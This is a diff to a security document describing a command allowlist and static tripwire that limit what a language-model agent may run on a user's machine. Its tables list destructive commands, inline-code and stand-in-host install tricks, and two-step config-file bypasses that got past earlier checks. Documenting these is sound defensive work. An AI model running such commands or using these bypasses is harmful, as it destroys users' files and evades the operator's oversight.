@@ -314,9 +314,6 @@ When llm-router maintainers report a security vulnerability:
 
 ## Local action safety contract (refuse-only)
 
-**In v16 the contract is not yet met; the gaps below are known and tracked
-(SAFEFIX).**
-
 **v16 is refuse-only.** The contract is that the router never runs a destructive
 local action on your behalf, and there is **no approval flow in v16**: nothing asks you "run this?",
 so nothing can be approved. A command the policy cannot clear is refused, and the
@@ -324,11 +321,18 @@ model is told it was not run. An approval prompt is planned for 16.x
 (owner decision D-321, 2026-10-28, which amends NFR-SAFE from "destructive needs
 approval" to "destructive is refused").
 
+**Allowlist-only (D-322, 2026-10-29).** The local lanes run only the programs
+on one allowlist, and for each allowed program that can write, delete or run
+something they read its flags. Any other program is refused. Some local tasks
+that used to run are therefore refused (for example `make`, `bash script.sh`,
+`git fetch`, `go mod tidy`); that cost was accepted with the decision.
+
 **One policy.** `src/llm_router/write_policy.py` is the only policy for local
 actions. `contain` is the one path-containment test, `check_write` its verdict for
 a file-tool write, `check_command` the static shell tripwire (P2.9-b), and
-`check_action` is `check_command` plus the destructive table (P2.9-a). Three lanes
-call it, each before anything runs:
+`check_action` is `check_command` plus the program allowlist (D-322, the list is
+`allowed_programs()`) plus the destructive table (P2.9-a). Three lanes call
+`check_action`, each before anything runs:
 
 | lane | entry point | code |
 |---|---|---|
@@ -342,15 +346,91 @@ call it, each before anything runs:
 
 | verdict | what every lane does |
 |---|---|
-| `refuse` | not run: a write target resolves outside the project root |
-| `needs_approval` | not run: destructive, installing, or cannot be judged statically |
+| `refuse` | not run: a write target, or a path the command works in or runs, resolves outside the project root |
+| `needs_approval` | not run: not on the allowlist, destructive, installing, or cannot be judged statically |
 | `allow` | runs, after the lane's own extra layers (below) |
+
+**What the allowlist admits.** Read and inspect tools (`ls`, `cat`, `grep`,
+`rg`, `find`, `sort`, `tree`, `diff` ...), the in-root writers whose targets the
+tripwire reads (`rm`, `cp`, `mv`, `tee`, `touch`, `mkdir`, `sed`, `awk`), read-only
+`git` subcommands plus `git add`, `git mv` and non-recursive `git rm`, project
+scripts (`python3 x.py`, `node x.js`, a script path that resolves inside the
+root), test and build tools (`pytest`, `python -m pytest|unittest|py_compile|compileall|json.tool|ruff`,
+`go build|test|vet|run`, `cargo build|check|test|run`, `npm test|run`,
+`yarn test|run`, `ruff check|format`) and the wrappers `time`, `timeout` and `uv run`.
+Rules it applies to those programs. They are general rules, not flag tables,
+because a test runner's plugins and a test binary's flags cannot be listed:
+
+- **Every path an interpreter or test runner is given must resolve inside the root.**
+  For `python`, `node`, `pytest`, `go`, `cargo`, `uv`, `pip`, `npm`, `yarn` and
+  `ruff`, every argument, every value after `=` or `:` inside one, and everything
+  after `--` or `-args` that looks like a path (contains `/`, starts with `~`, or
+  is `..`) is resolved (`Path.resolve`, symlinks followed) and refused if it lands
+  outside the root: `pytest -o log_file=~/.zshrc`, `node --test-reporter-destination=`,
+  `go test -test.coverprofile=`, `cargo test -- --logfile`, `pip --python /x/exe`,
+  `python3 -X pycache_prefix=`. An argument built from a shell expansion needs
+  approval, and so does any such argument that contains `$` or a backtick, quoted
+  or not, because a runner may expand it itself (pytest runs `expandvars` on
+  `--junitxml`). Known false refusals: a script argument that is an outside path
+  even when it is only read (`python3 s.py /etc/hosts`), an argument that only
+  looks like an absolute path (`node s.js /api/users`, `npm run build --
+  --base=/app/`, `go test -run=/sub ./...`), a regex with `$` (`pytest -k 'x$'`),
+  `python3 -m compileall -d /abs`, `node cli -p 3000` when the script has no
+  JS extension and no `/`, `node --test` with no path (read as code from stdin),
+  `python3 -m pip list`, and `go test <module>/...` when the root has no `go.mod`
+  naming that module. Other programs have their
+  output flags read one by one: `sort -o`, `uniq IN OUT`, `tree -o`,
+  `git --output`, `git archive -o`, `git -C/--git-dir/--work-tree`, and the operands of `git add/mv/rm` (with the
+  root nested in a larger repository, `git rm ../x` deletes outside it).
+- **Inline code is refused in any spelling.** `python -c` attached, clustered or
+  followed by a script name (`python3 '-c…' s.py`, `python3 -Ic…`); `node -e/-p`,
+  `--eval=`, `--print=`; and a `node --require/--import/--loader` module that is
+  a `data:` or URL module, or a path outside the root.
+- **`go run|build|test|vet|list` take only local packages** (`.`, `./...`,
+  `./cmd/x`, `x.go`, or a path under the `module` named in the root's `go.mod`).
+  Any other module path (`example.com/x/cmd`, `pkg@latest`) is code go
+  downloads, and it is refused, and so are `all`, `std` and `cmd`. Go flags are
+  read with one or two dashes and with `=value` (`go env --w`, `-w=true`).
+- **The working directory stays inside the root.** `cd`/`pushd` to a directory
+  outside the root is refused, and so is a `cd`/`popd` whose target cannot be
+  resolved statically: later commands work on the current directory without
+  naming a path (`cd ~ && ruff format`).
+- **Flags that delete or run a command are refused:** `find -delete/-exec/-execdir/-ok/-fprint*`,
+  `rg --pre/--pre-glob`, `sort --compress-program`, `tree -R`, `git grep --open-files-in-pager`,
+  `git diff --ext-diff`, `go -exec/-toolexec/-vettool/-overlay`, `go env -w/-u`, `cargo --config`,
+  `npm --script-shell`, `uv run --with/-w` and `uv run`'s index, find-links,
+  upgrade and refresh options (they install packages, which then run),
+  `node --inspect=<non-loopback host>`, an
+  existing `pytest --basetemp` directory (pytest deletes it first), and every
+  `git -c KEY` except formatting keys (`color.*`, `log.*`, `core.quotepath`,
+  `core.pager=cat` ...). `core.pager`, `alias.*`, `core.fsmonitor`,
+  `core.sshCommand`, `diff.external` and the rest are refused, attached
+  (`-ckey=v`) too.
+- **A command prefix may set only harmless variables** (`PYTHONPATH`, `NO_COLOR`,
+  `CI` ...), and a path in one must be inside the root (`PYTHONPATH=/x` is
+  refused). `GIT_EXTERNAL_DIFF=`, `PYTEST_ADDOPTS=`, `PATH=` and the like are refused.
+- **The file that runs must be a system program, in both directions.** A program
+  given as a path is refused, whatever its name (`./cat`, `src/find`,
+  `/x/python3`, `/usr/bin/python3`): a name says nothing about the file behind
+  it. A bare name runs what `PATH` finds. It is refused when `PATH` has a
+  relative entry, or when the file it finds is inside the root (a file the model
+  could have written). The one exception is a project virtualenv or
+  `node_modules/.bin`, and `uv run`'s own environment, which fall under the
+  residual below. A program off the list stays refused under any path
+  (`/usr/bin/crontab -r`).
+- **Writes into `.git` are refused** in any letter case (`.GIT` is the same
+  directory on the default macOS filesystem), from the file tools and from a
+  command (`echo x > .git/hooks/pre-commit`), because git runs its hooks and config.
+- **Expansion is tracked per word.** A word built from `$VAR` or a backtick
+  needs approval even when a quoted copy with the same text appears in the same
+  command (`rm $HOME/x '$HOME/x'`).
 
 **Refused on every lane, in every configuration.** `check_action` is the last check
 on all three lanes, so these hold with `LLM_ROUTER_AGENT_WRITES=apply` and
 `LLM_ROUTER_AGENT_COMMANDS=all` too. The rows are representative, not the full
-table; the full table is `_segment_destructive` and `_check_tokens` in
-`write_policy.py`.
+table; the full table is `_segment_destructive`, `_check_tokens` and the D-322
+allowlist in `write_policy.py`. In a command, `{OUT}` is a directory outside the
+project root and `{HOME}` is the home directory.
 
 | command | verdict | class |
 |---|---|---|
@@ -380,6 +460,140 @@ table; the full table is `_segment_destructive` and `_check_tokens` in
 | `echo $(rm -rf src)` | `needs_approval` | command substitution |
 | `echo x > $HOME/x` | `needs_approval` | write target built from a variable |
 
+Refused since D-322 (SAFEFIX). Each row below ran on at least one lane before
+D-322; the last column says what it did. Measured 2026-10-28 and 2026-10-29 against
+the real executors (the UN-15 known-gaps table and the probe lists behind the
+reviews of PR #778 and PR #785, twice).
+
+| command | verdict | class | what it did before D-322 |
+|---|---|---|---|
+| `find . -delete` | `needs_approval` | delete, write or exec flag of an allowed program | deletes every file under the root; `rm -r` is refused but `find -delete` is not on the destructive table |
+| `tar -xf a.tar -C /` | `needs_approval` | program not on the allowlist | extracts outside the root; the tripwire does not read `tar -C` |
+| `unzip a.zip -d /tmp` | `needs_approval` | program not on the allowlist | extracts outside the root; the tripwire does not read `unzip -d` |
+| `kill -9 1` | `needs_approval` | program not on the allowlist | a process signal is not a write, so nothing checks it |
+| `pkill python` | `needs_approval` | program not on the allowlist | a process signal is not a write, so nothing checks it |
+| `killall Finder` | `needs_approval` | program not on the allowlist | kills processes by name |
+| `crontab -r` | `needs_approval` | program not on the allowlist | deletes the user's crontab |
+| `launchctl bootout gui/501` | `needs_approval` | program not on the allowlist | ends the user's login session |
+| `diskutil eraseDisk JHFS+ x disk2` | `needs_approval` | program not on the allowlist | erases a disk |
+| `security delete-keychain login.keychain` | `needs_approval` | program not on the allowlist | deletes the login keychain |
+| `defaults delete com.apple.dock` | `needs_approval` | program not on the allowlist | deletes an application's preferences |
+| `srm -rf src` | `needs_approval` | program not on the allowlist | recursive delete; the `\brm` regex does not match `srm` |
+| `trash src` | `needs_approval` | program not on the allowlist | recursive delete |
+| `unlink {HOME}/.zshrc` | `needs_approval` | program not on the allowlist | deletes a file outside the root, although `rm` of it is refused |
+| `rmdir {OUT}` | `needs_approval` | program not on the allowlist | deletes a directory outside the root |
+| `pytest --basetemp={OUT}` | `refuse` | output flag outside the root | pytest runs `rm -rf` on the basetemp directory, outside the root |
+| `python3 -m pytest --basetemp={OUT}` | `refuse` | output flag outside the root | the same, through `python -m` |
+| `pytest --basetemp=~/Documents` | `refuse` | output flag outside the root | the same, on a directory in the home directory |
+| `rg --pre rm x .` | `needs_approval` | delete, write or exec flag of an allowed program | runs `rm FILE` on every file searched, deleting the tree (toolkit: its sandboxed copy) |
+| `python3 -m timeit -n1 "__import__('shutil').rmtree('src')"` | `needs_approval` | `python -m` module not on the allowlist | inline code that gets past the interpreter one-liner refusal |
+| `python3 -m timeit -s "import shutil" "shutil.rmtree('src')"` | `needs_approval` | `python -m` module not on the allowlist | inline code that gets past the interpreter one-liner refusal |
+| `python3 -m json.tool a.txt {HOME}/.zshrc` | `refuse` | output argument outside the root | overwrites a file outside the root |
+| `sort -o {HOME}/.zshrc a.txt` | `refuse` | output flag outside the root | overwrites a file outside the root |
+| `uniq a.txt {HOME}/.zshrc` | `refuse` | output argument outside the root | overwrites a file outside the root |
+| `tree -o {HOME}/.zshrc` | `refuse` | output flag outside the root | overwrites a file outside the root |
+| `git diff --output={HOME}/.zshrc` | `refuse` | output flag outside the root | overwrites a file outside the root |
+| `go build -o {HOME}/.zshrc .` | `refuse` | output flag outside the root | overwrites a file outside the root |
+| `git archive -o {OUT}/x.tar HEAD` | `refuse` | output flag outside the root | writes a file outside the root |
+| `python3 -m tarfile -e a.tar {HOME}` | `refuse` | argument outside the root | extracts outside the root |
+| `python3 -m zipfile -e a.zip {OUT}` | `refuse` | argument outside the root | extracts outside the root |
+| `git read-tree --reset -u HEAD` | `needs_approval` | git subcommand not on the allowlist | discards working-tree changes, the same effect as the refused `git reset --hard` |
+| `git checkout-index -a -f` | `needs_approval` | git subcommand not on the allowlist | overwrites working-tree changes |
+| `git --work-tree={OUT} checkout-index -a -f` | `refuse` | working path outside the root | writes the index out to a directory outside the root |
+| `git update-ref -d refs/heads/main` | `needs_approval` | git subcommand not on the allowlist | deletes a branch ref |
+| `git reflog expire --expire=now --all` | `needs_approval` | git subcommand form that changes state | destroys the reflog, the usual recovery path |
+| `git filter-branch -f --tree-filter true HEAD` | `needs_approval` | git subcommand not on the allowlist | rewrites history |
+| `git submodule deinit -f --all` | `needs_approval` | git subcommand form that changes state | removes submodule working trees |
+| `git worktree remove --force {OUT}` | `needs_approval` | git subcommand form that changes state | deletes a directory outside the root |
+| `git rm -q -r src` | `needs_approval` | recursive delete | recursive delete of tracked files |
+| `git rm --recursive src` | `needs_approval` | recursive delete | recursive delete of tracked files |
+| `git rm -r src` | `needs_approval` | recursive delete | recursive delete of tracked files; `git rm` is on neither git table (`llm_act`'s regex catches only this spelling) |
+| `git -C {OUT} rm -r x` | `refuse` | working path outside the root | deletes files outside the root |
+| `git -c alias.x='!rm -rf src' x` | `needs_approval` | `git -c` key that can run a command | runs any command the model writes |
+| `git -c core.pager='rm -rf src' log` | `needs_approval` | `git -c` key that can run a command | runs any command the model writes |
+| `cargo uninstall ripgrep` | `needs_approval` | subcommand not on the allowlist | deletes a binary from `~/.cargo/bin`, outside the root |
+| `go clean -modcache` | `needs_approval` | subcommand not on the allowlist | deletes the Go module cache, outside the root |
+| `wget -O /etc/x https://example.com` | `needs_approval` | program not on the allowlist | without the allowlist, a program that writes on its own reaches outside the root |
+| `rsync -a --delete . /tmp/x` | `needs_approval` | program not on the allowlist | without the allowlist, a program that writes on its own reaches outside the root |
+| `docker system prune -af` | `needs_approval` | program not on the allowlist | deletes every unused container, image and volume |
+| `sqlite3 {HOME}/x.db 'drop table t'` | `needs_approval` | program not on the allowlist | changes a database outside the root |
+| `cmake -E remove_directory {OUT}` | `needs_approval` | program not on the allowlist | deletes a directory outside the root |
+| `make -C {OUT} clean` | `needs_approval` | program not on the allowlist | runs another directory's recipes |
+| `bash s.sh` | `needs_approval` | program not on the allowlist | runs a shell script (a script the model can write first) |
+| `git bisect run rm -rf src` | `needs_approval` | git subcommand not on the allowlist | git runs the command it is given |
+| `git difftool -y -x 'rm -rf src'` | `needs_approval` | git subcommand not on the allowlist | git runs the command it is given |
+| `git grep --open-files-in-pager='rm -rf' x` | `needs_approval` | delete, write or exec flag of an allowed program | git runs the pager command it is given |
+| `git -c core.fsmonitor='rm -rf src' status` | `needs_approval` | `git -c` key that can run a command | git runs the fsmonitor command on `status` |
+| `git -c core.sshCommand='rm -rf src' fetch` | `needs_approval` | `git -c` key that can run a command | git runs the ssh command |
+| `git -c diff.external=./s.sh diff` | `needs_approval` | `git -c` key that can run a command | git runs the external diff program |
+| `GIT_EXTERNAL_DIFF=./s.sh git diff` | `needs_approval` | environment prefix that changes what runs | git runs the external diff program named by the variable |
+| `PYTEST_ADDOPTS=--basetemp={OUT} pytest` | `needs_approval` | environment prefix that changes what runs | the variable adds `--basetemp`, which pytest deletes first |
+| `pytest --basetemp=src` | `needs_approval` | pytest deletes `--basetemp` first | pytest runs `rm -rf` on an existing directory inside the root |
+| `python3 -m compileall {OUT}` | `refuse` | compile target outside the root | writes `__pycache__` outside the root |
+| `python3 -m runpy x` | `needs_approval` | `python -m` module not on the allowlist | runs a module given on the command line |
+| `python3 -m venv {OUT}/v` | `refuse` | argument outside the root | creates an environment outside the root |
+| `python3 {OUT}/s.py` | `refuse` | working path outside the root | runs a script that is not a project file |
+| `git clone . {OUT}/clone` | `needs_approval` | git subcommand not on the allowlist | writes a repository outside the root |
+| `git init {OUT}/newrepo` | `needs_approval` | git subcommand not on the allowlist | creates a repository outside the root |
+| `git worktree add {OUT}/wt` | `needs_approval` | git subcommand form that changes state | writes a working tree outside the root |
+| `go clean -cache` | `needs_approval` | subcommand not on the allowlist | deletes the Go build cache, outside the root |
+| `go env -w GOFLAGS=-x` | `needs_approval` | delete, write or exec flag of an allowed program | writes the user's Go configuration |
+| `uv cache clean` | `needs_approval` | program or subcommand not on the allowlist | deletes the uv cache, outside the root |
+| `npm cache clean --force` | `needs_approval` | program or subcommand not on the allowlist | deletes the npm cache, outside the root |
+| `pip cache purge` | `needs_approval` | program or subcommand not on the allowlist | deletes the pip cache, outside the root |
+| `python3 '-c__import__("os").system("touch {OUT}/pwn")' s.py` | `needs_approval` | interpreter inline code (any spelling) | inline code attached to `-c`, with a script name after it |
+| `python3 -I '-c__import__("shutil").rmtree("{OUT}")' a.txt` | `needs_approval` | interpreter inline code (any spelling) | inline code inside an option cluster |
+| `node '--eval=require("child_process").execSync("touch {OUT}/pwn")' s.js` | `needs_approval` | interpreter inline code (any spelling) | `--eval=` inline code |
+| `node --print=1 s.js` | `needs_approval` | interpreter inline code (any spelling) | `--print=` inline code |
+| `node --import 'data:text/javascript,import("child_process")' s.js` | `needs_approval` | interpreter inline code (any spelling) | a `data:` module is inline code |
+| `node -r {OUT}/evil.js s.js` | `refuse` | argument outside the root | preloads code that is not a project file |
+| `pytest -o log_file={HOME}/.zshrc --co -q` | `refuse` | argument outside the root | truncates a file outside the root |
+| `python3 -m pytest -o log_file={OUT}/victim -q` | `refuse` | argument outside the root | truncates a file outside the root |
+| `pytest -o pythonpath={OUT}` | `refuse` | argument outside the root | imports code from outside the root |
+| `pytest -c {OUT}/pytest.ini` | `refuse` | argument outside the root | reads a config from outside the root |
+| `pytest --benchmark-json={OUT}/x` | `refuse` | argument outside the root | a plugin flag writes outside the root |
+| `node --test --test-reporter-destination={OUT}/victim s.js` | `refuse` | argument outside the root | overwrites a file outside the root |
+| `go test -test.coverprofile={OUT}/victim ./...` | `refuse` | argument outside the root | writes outside the root (`test.` prefix) |
+| `go test ./... -args -test.cpuprofile={OUT}/victim` | `refuse` | argument outside the root | writes outside the root (after `-args`) |
+| `cargo test -- --logfile {OUT}/victim` | `refuse` | argument outside the root | libtest writes outside the root (after `--`) |
+| `python3 -X pycache_prefix={OUT} s.py` | `refuse` | argument outside the root | writes bytecode outside the root |
+| `npm --logs-dir={OUT} test` | `refuse` | argument outside the root | writes logs outside the root |
+| `pip --python {OUT}/exe list` | `refuse` | argument outside the root | runs a file outside the root |
+| `PYTHONPATH={OUT} python3 s.py` | `refuse` | environment value outside the root | imports code (sitecustomize) from outside the root |
+| `uv run --python {OUT}/exe s.py` | `refuse` | argument outside the root | runs a file outside the root |
+| `uv run --with evilpkg pytest` | `needs_approval` | `uv run --with` installs code | installs a package from an index, which then runs |
+| `go run example.com/evil/cmd@latest` | `needs_approval` | go module path | downloads and runs code the model names |
+| `go run {OUT}/main.go` | `refuse` | argument outside the root | runs code that is not a project file |
+| `./cat a.txt` | `needs_approval` | program given as a path | runs a file named like an allowed program |
+| `{OUT}/python3 s.py` | `needs_approval` | program given as a path | runs a file named like an allowed program |
+| `echo x > .git/hooks/pre-commit` | `needs_approval` | write into `.git` | writes a hook git runs later |
+| `git diff --ext-diff` | `needs_approval` | delete, write or exec flag of an allowed program | runs the configured external diff program |
+| `rm $HOME/victim_rm '$HOME/victim_rm'` | `needs_approval` | expansion flag per token | deleted a file outside the root (a quoted copy cleared the expansion flag) |
+| `touch $HOME/x '$HOME/x'` | `needs_approval` | expansion flag per token | wrote outside the root (a quoted copy cleared the expansion flag) |
+| `gsed -i s/a/b/ $HOME/.zshrc '$HOME/.zshrc'` | `needs_approval` | expansion flag per token | edited a file outside the root (a quoted copy cleared the expansion flag) |
+| `pytest '--junitxml=$HOME/victim'` | `needs_approval` | runner argument with `$` | pytest expands `$HOME` itself and overwrote a file outside the root |
+| `pytest -o 'log_file=$HOME/.zshrc'` | `needs_approval` | runner argument with `$` | pytest expands `$HOME` itself and truncates the file |
+| `python3 -m pytest '--basetemp=$HOME/bt'` | `needs_approval` | runner argument with `$` | pytest expands `$HOME` itself and deletes the directory |
+| `cd ~ && ruff format` | `refuse` | `cd` out of the root | reformatted Python files outside the root |
+| `cd {OUT} && pytest` | `refuse` | `cd` out of the root | runs tests and a conftest that are not project code |
+| `cd .. && pytest` | `refuse` | `cd` out of the root | runs tests outside the root |
+| `pushd {OUT} && npm test` | `refuse` | `cd` out of the root | runs another directory's package.json script |
+| `git rm -q ../victim_git.txt` | `refuse` | git operand outside the root | deleted a file outside a nested root |
+| `git mv -f a.txt ../victim.txt` | `refuse` | git operand outside the root | overwrites a file outside a nested root |
+| `git add ../x` | `refuse` | git operand outside the root | stages a file outside a nested root |
+| `go env --w GOFLAGS=-x` | `needs_approval` | `go env -w` in any spelling | writes the user's Go configuration (`--w` spelling) |
+| `go env -w=true GOPROXY=https://evil.example` | `refuse` | `go env -w` in any spelling | writes the user's Go configuration (`-w=true` spelling) |
+| `go env --u GOFLAGS` | `needs_approval` | `go env -w` in any spelling | writes the user's Go configuration (`--u` spelling) |
+| `node -C x -e 'require("fs")'` | `needs_approval` | interpreter inline code (any spelling) | inline code behind an option that takes a value |
+| `node --conditions x -e 1` | `needs_approval` | interpreter inline code (any spelling) | inline code behind an option that takes a value |
+| `python3 --check-hash-based-pycs always -c 1` | `needs_approval` | interpreter inline code (any spelling) | inline code behind an option that takes a value |
+| `echo x >> .GIT/config` | `needs_approval` | write into `.git` (any case) | appended to `.git/config` (case-insensitive filesystem) |
+| `uv run --index-url https://evil.example/simple --upgrade pytest` | `needs_approval` | `uv run` index or upgrade option | installs packages from an index the model chose |
+| `uv run -w evilpkg pytest` | `needs_approval` | `uv run --with` installs code | installs a package, which then runs (`-w` is `--with`) |
+| `go test all` | `needs_approval` | not a project package | runs the tests of dependencies |
+| `node --inspect=0.0.0.0:9229 s.js` | `needs_approval` | debugger beyond loopback | opens the debugger to the network |
+| `pytest @{OUT}/args.txt` | `refuse` | argument outside the root | reads options from a file outside the root |
+
 File-tool writes (`write_file`, `edit_file`, the toolkit `write`) go through
 `contain`. A path that resolves outside the root is refused on every lane,
 symlinks followed; a `~` path is refused rather than expanded:
@@ -396,45 +610,64 @@ symlinks followed; a `~` path is refused rather than expanded:
 - `llm_act` refuses `bash` and `write_file` outright when no project root is known
   (read-only mode, P0.13), and runs a regex blocklist (`_bash_block_reason`) for
   `rm -r`/`-f`, credential paths, environment dumps and network tools before
-  `check_action`. **`llm_act` is a denylist lane:** a program that is on neither
-  the blocklist nor the destructive table runs (`crontab -r`, `killall`,
-  `unlink`, `srm`, `diskutil eraseDisk` in the gaps table below).
+  `check_action`.
 - `llm_local_task`'s **file tools** write nothing by default:
   `LLM_ROUTER_AGENT_WRITES=propose` returns the edit as a diff and leaves the file
   unchanged; `off` refuses it (`src/llm_router/hooks/agent_writes.py`, `guard`).
-  Its `run_command` is a different matter. It passes an inspection allowlist
-  (`guard_command`, below) and `check_action`, and then runs. This lane is the one
-  behind `LLM_ROUTER_DIRECT_EXECUTION`, which is on by default, so the
-  allowed-program gaps below apply to it in the default configuration. Under
-  `propose` and `off` the allowlist also refuses the literal flags `python -c`,
-  `node -e`, `sed -i` and `find -delete`. It does not refuse `python3 -m timeit
-  "<code>"`, which runs the same code.
+  Its `run_command` passes an inspection list (`guard_command`, below) and then
+  `check_action`, and then runs. This lane is the one behind
+  `LLM_ROUTER_DIRECT_EXECUTION`, which is on by default. Under `propose` and `off`
+  the inspection list also refuses the literal flags `python -c`, `node -e`,
+  `sed -i` and `find -delete`.
 - `toolkit` works on a copy of the project, allows bash only when the OS sandbox is
-  available, and has its own program allowlist (`ALLOWED_PROGRAMS`).
+  available, and has its own, narrower program allowlist (`ALLOWED_PROGRAMS`).
 
-**This is a tripwire, not a sandbox.** Static reading of a command line cannot see
-what a permitted program does on its own. Reads outside the root and network use
-are not part of this contract. An OS-level write sandbox is 16.1. The classes it
-misses, each pinned with examples in the gaps table:
+**This is a static, best-effort tripwire over shell text, not a sandbox.** The
+check reads the command line before it runs. It cannot see what a permitted
+program does on its own, and static parsing of shell cannot be complete: every
+review round of this policy (PR #778, PR #785 twice) found bypasses that earlier
+rounds had missed, and **unknown bypasses may still exist**. Every bypass the
+reviews found is now a refused row above, driven through the real lanes, but
+that is evidence about those rows, not a guarantee about the rest. Reads outside
+the root and network use are not part of this contract. The containment that
+does not depend on parsing is the OS-level write sandbox planned for 16.1
+(R-LOC-7 stays partial; D-R8-3). What the allowlist deliberately leaves running
+is accepted residual:
 
-- **Denylist lane.** On `llm_act` any program that is not on the destructive table
-  or the regex blocklist runs.
-- **An allowed program's own output, delete or exec flags are not read.** Examples:
-  `sort -o`, `tree -o`, `git diff --output=`, `go build -o`, `git archive -o`,
-  `pytest --basetemp=` (pytest runs `rm -rf` on that directory), `rg --pre`
-  (runs a command on every file it searches), and `git -c core.pager=` /
-  `git -c alias.x='!…'`, which run any command the model writes.
-- **`python -m <module>` is not an interpreter one-liner to the tripwire.**
-  `python3 -m timeit` evaluates code, and `python3 -m tarfile -e` /
-  `python3 -m zipfile -e` extract archives anywhere.
-- **Git plumbing outside the two git tables runs.** Examples: `read-tree`,
-  `checkout-index`, `update-ref`, `reflog expire`, `filter-branch`,
-  `submodule deinit`, `worktree remove` and `rm`.
-- **Tools that delete outside the root by their own design.** Examples:
-  `cargo uninstall`, `go clean -modcache`.
+- **Code the lane runs: scripts, test runners, `go run`, `cargo run`, `npm run`.**
+  Running the project's own code and tests is the purpose of the lanes, so a
+  project script (`python3 s.py`, `node s.js`), `pytest`, `go test`, `go run`,
+  `cargo run` and `npm test`/`npm run <script>` run, and that code can do
+  anything the operator can. On `llm_act` the model can write that code first
+  with `write_file` (inside the root, allowed by design) and then run it. This is
+  an accepted residual of v16, pinned below as a by-design behaviour; containment
+  for it is the 16.1 OS sandbox.
+- **Repository config files can turn a refused flag back on in two steps.** An
+  allowed program reads its own config from the project: `pyproject.toml`,
+  `pytest.ini`, `setup.cfg` and `tox.ini` (`addopts = --basetemp=…`, `log_file`),
+  `conftest.py`, `.cargo/config.toml` (`build.rustc-wrapper`), `.npmrc`
+  (`script-shell`) and `package.json` scripts. On `llm_act` the model can write
+  such a file inside the root and then run the tool, which gets past the
+  `-o addopts=`, `cargo --config` and `npm --script-shell` refusals. These are not
+  refused, for two reasons. Editing them is ordinary project work. And a refusal
+  in the file tools alone would not hold, because the in-root shell writers
+  (`tee`, `sed -i`, `>`) reach the same files. It is the same residual as the
+  item above. Writes into `.git` (hooks, `.git/config`) are the exception: git
+  needs no project file for them, so they are refused (rule above). Git commands
+  that read repository config (`--textconv`, `cat-file --filters`,
+  `--show-signature`, `-p`) are in the same residual.
+- **Other inputs an allowed program reads from the project.** A pytest response
+  file (`pytest @args.txt`, pytest 8.2 and later), `--env-file` (`node
+  --env-file=.env`, `uv run --env-file .env`) and `.env` files, which can set
+  `NODE_OPTIONS` or `PYTEST_ADDOPTS`, `node --run <script>` (package.json scripts),
+  modules installed in the project environment that `node --require <pkg>`,
+  `pytest -p <module>` or `python3 -m unittest <module>` import, and the project's
+  own `.venv/bin` or `node_modules/.bin` programs when they are on `PATH` or run by
+  `uv run`. Each can carry an option or code the command line does not show.
+- **Writes inside the root by an allowed program** (`rm a.txt`, `sed -i`,
+  `git rm a.txt`, `go build`): the same reach as the lane's file tools.
 
-Runs by design (the same reach as the lane's own file tools, or the point of the
-lane):
+Runs by design:
 
 | lane | command |
 |---|---|
@@ -442,69 +675,13 @@ lane):
 | `llm_act` | `: > a.txt` |
 | `llm_act` | `pytest -q` |
 | `llm_local_task` | `pytest -q` |
+| `llm_act` | `python3 s.py` |
+| `llm_local_task` | `python3 s.py` |
 
-**Known gaps: destructive commands that still run.** Measured 2026-10-28 against
-the real executors, with the execution step replaced by a recorder. The rows are
-examples of the classes above; they do not list every command in those classes.
-In a command, `{OUT}` is a directory outside the project root and `{HOME}` is the
-home directory. Each row, on each lane it names, is pinned as a strict expected
-failure in `tests/test_security_docs_match_the_code.py`. A fix therefore fails that
-test until the row moves out of this table. Tracked for repair as SAFEFIX.
-
-| lane | configuration | command | effect |
-|---|---|---|---|
-| `llm_act` | default | `find . -delete` | deletes every file under the root; `rm -r` is refused but `find -delete` is not on the destructive table |
-| `llm_act` | default | `tar -xf a.tar -C /` | extracts outside the root; the tripwire does not read `tar -C` |
-| `llm_act` | default | `unzip a.zip -d /tmp` | extracts outside the root; the tripwire does not read `unzip -d` |
-| `llm_act` | default | `kill -9 1` | a process signal is not a write, so nothing checks it |
-| `llm_act` | default | `pkill python` | a process signal is not a write, so nothing checks it |
-| `llm_act` | default | `killall Finder` | kills processes by name |
-| `llm_act` | default | `crontab -r` | deletes the user's crontab |
-| `llm_act` | default | `launchctl bootout gui/501` | ends the user's login session |
-| `llm_act` | default | `diskutil eraseDisk JHFS+ x disk2` | erases a disk |
-| `llm_act` | default | `security delete-keychain login.keychain` | deletes the login keychain |
-| `llm_act` | default | `defaults delete com.apple.dock` | deletes an application's preferences |
-| `llm_act` | default | `srm -rf src` | recursive delete; the `\brm` regex does not match `srm` |
-| `llm_act` | default | `trash src` | recursive delete |
-| `llm_act` | default | `unlink {HOME}/.zshrc` | deletes a file outside the root, although `rm` of it is refused |
-| `llm_act` | default | `rmdir {OUT}` | deletes a directory outside the root |
-| `llm_act`, `llm_local_task` | default | `pytest --basetemp={OUT}` | pytest runs `rm -rf` on the basetemp directory, outside the root |
-| `llm_act`, `llm_local_task` | default | `python3 -m pytest --basetemp={OUT}` | the same, through `python -m` |
-| `llm_act`, `llm_local_task` | default | `pytest --basetemp=~/Documents` | the same, on a directory in the home directory |
-| `llm_act`, `llm_local_task`, `toolkit` | default | `rg --pre rm x .` | runs `rm FILE` on every file searched, deleting the tree (toolkit: its sandboxed copy) |
-| `llm_act`, `llm_local_task` | default | `python3 -m timeit -n1 "__import__('shutil').rmtree('src')"` | inline code that gets past the interpreter one-liner refusal |
-| `llm_act`, `llm_local_task` | default | `python3 -m timeit -s "import shutil" "shutil.rmtree('src')"` | inline code that gets past the interpreter one-liner refusal |
-| `llm_act`, `llm_local_task` | default | `python3 -m json.tool a.txt {HOME}/.zshrc` | overwrites a file outside the root |
-| `llm_act`, `llm_local_task` | default | `sort -o {HOME}/.zshrc a.txt` | overwrites a file outside the root |
-| `llm_act`, `llm_local_task` | default | `uniq a.txt {HOME}/.zshrc` | overwrites a file outside the root |
-| `llm_act`, `llm_local_task` | default | `tree -o {HOME}/.zshrc` | overwrites a file outside the root |
-| `llm_act`, `llm_local_task` | default | `git diff --output={HOME}/.zshrc` | overwrites a file outside the root |
-| `llm_act`, `llm_local_task` | default | `go build -o {HOME}/.zshrc .` | overwrites a file outside the root |
-| `llm_act`, `llm_local_task` | default | `git archive -o {OUT}/x.tar HEAD` | writes a file outside the root |
-| `llm_act`, `llm_local_task` | default | `python3 -m tarfile -e a.tar {HOME}` | extracts outside the root |
-| `llm_act`, `llm_local_task` | default | `python3 -m zipfile -e a.zip {OUT}` | extracts outside the root |
-| `llm_act`, `llm_local_task` | default | `git read-tree --reset -u HEAD` | discards working-tree changes, the same effect as the refused `git reset --hard` |
-| `llm_act`, `llm_local_task` | default | `git checkout-index -a -f` | overwrites working-tree changes |
